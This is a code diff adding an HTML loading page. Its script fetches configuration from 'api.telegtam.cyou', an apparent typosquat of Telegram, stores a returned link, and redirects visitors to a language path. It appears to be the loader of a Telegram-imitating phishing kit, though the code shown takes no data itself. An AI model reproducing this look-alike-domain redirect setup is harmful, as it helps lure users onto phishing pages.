@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Loading...</title>
+<style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+
+        .loading-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            width: 60px;
+            height: 60px;
+        }
+
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+        }
+
+        .logo {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            z-index: 1;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+<div class="loading-container">
+<div class="spinner"></div>
+<img alt="Logo" class="logo" src="local_resources/img/796b11d872b2cb7426ec4622a7da7dc7.png"/>
+</div>
+<script>
+    // 设置本地存储变量
+    const hostValue = 'https://api.telegtam.cyou';
+    localStorage.setItem('host', hostValue);
+
+    // 获取并打印本地存储的变量
+    const storedHost = localStorage.getItem('host');
+    console.log('Stored host value:', storedHost);
+
+    // 通过 API 获取配置
+    function fetchConfig() {
+        const configUrl = `${storedHost}/api/index/config`; // 构建 API URL
+
+        fetch(configUrl)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok.');
+                }
+                return response.json(); // 解析为 JSON
+            })
+            .then(data => {
+                console.log('API 返回的数据:', data);
+                // 处理返回的数据
+                if (data.status === 'success') {
+                    localStorage.setItem('location', data.data.link);
+                    const lang = data.data.lang;
+                    console.log('location:', data.data.link);
+                    console.log('Language:', lang);
+                    const nextPageUrl = `/${lang}`; // 动态设置 nextPageUrl
+                    redirectToNextPage(nextPageUrl);
+                } else {
+                    console.error('获取配置失败:', data);
+                }
+            })
+            .catch(error => {
+                console.error('获取配置时出错:', error);
+            });
+    }
+
+    // 页面重定向处理函数
+    function redirectToNextPage(nextPageUrl) {
+        window.location.href = nextPageUrl;
+    }
+
+    // 预加载下一个页面并获取配置
+    fetch(`${storedHost}/api/index/config`) // 预加载配置文件
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok.');
+            }
+            return response.json(); // 解析为 JSON
+        })
+        .then(data => {
+            console.log('预加载配置成功。');
+            fetchConfig(); // 调用获取配置函数
+        })
+        .catch(error => {
+            console.error('预加载配置时出错:', error);
+        });
+</script>
+</body>
+</html>
